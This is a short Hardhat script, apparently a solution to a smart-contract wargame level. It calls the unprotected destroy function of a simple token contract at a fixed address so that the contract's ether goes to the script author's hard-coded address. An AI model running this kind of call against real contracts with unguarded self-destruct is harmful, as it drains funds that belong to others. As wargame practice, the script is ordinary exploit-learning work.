import hre, { ethers } from "hardhat";
import {King__factory} from "../typechain-types/factories/King__factory"    

const MY_ADDR = "0x72fB93B48d079C3Caab06689EeA68d025cD2f97c"

async function main() {
    const signer = await ethers.provider.getSigner();
    // Contract setup
    const contractAddress = "0xb1f46DD080A31C1697408Cd20f78D7943E5c59EC"; // Replace with your contract address
    
    const abi = [
      {
          "inputs": [
              {
                  "internalType": "string",
                  "name": "_name",
                  "type": "string"
              },
              {
                  "internalType": "address",
                  "name": "_creator",
                  "type": "address"
              },
              {
                  "internalType": "uint256",
                  "name": "_initialSupply",
                  "type": "uint256"
              }
          ],
          "stateMutability": "nonpayable",
          "type": "constructor"
      },
      {
          "inputs": [
              {
                  "internalType": "address",
                  "name": "_to",
                  "type": "address"
              },
              {
                  "internalType": "uint256",
                  "name": "_amount",
                  "type": "uint256"
              }
          ],
          "name": "transfer",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
      },
      {
          "inputs": [
              {
                  "internalType": "address payable",
                  "name": "_to",
                  "type": "address"
              }
          ],
          "name": "destroy",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
      },
      {
          "stateMutability": "payable",
          "type": "receive"
      },
      {
          "inputs": [],
          "name": "name",
          "outputs": [
              {
                  "internalType": "string",
                  "name": "",
                  "type": "string"
              }
          ],
          "stateMutability": "view",
          "type": "function"
      },
      {
          "inputs": [
              {
                  "internalType": "address",
                  "name": "",
                  "type": "address"
              }
          ],
          "name": "balances",
          "outputs": [
              {
                  "internalType": "uint256",
                  "name": "",
                  "type": "uint256"
              }
          ],
          "stateMutability": "view",
          "type": "function"
      }
  ]
  
    const contract = new ethers.Contract(contractAddress, abi, signer);
    const result = await contract.destroy(MY_ADDR);
    const receipt = await result.wait();
    console.log(receipt)
  }


  main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
